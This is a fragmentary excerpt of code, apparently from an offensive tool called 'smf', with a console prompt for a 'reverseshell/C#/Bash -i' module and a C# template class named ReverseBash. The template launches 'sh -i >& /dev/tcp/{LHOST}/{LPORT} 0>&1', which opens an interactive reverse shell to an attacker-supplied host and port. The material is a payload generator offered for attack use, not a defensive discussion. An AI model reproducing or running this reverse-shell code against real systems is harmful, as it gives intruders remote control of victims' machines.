...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/C#/Bash -i\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/C#/Bash -i\033[1;31m)> \033[1;32m")
...
namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  ...
	  proc.StartInfo.Arguments = "-c \"sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\"";
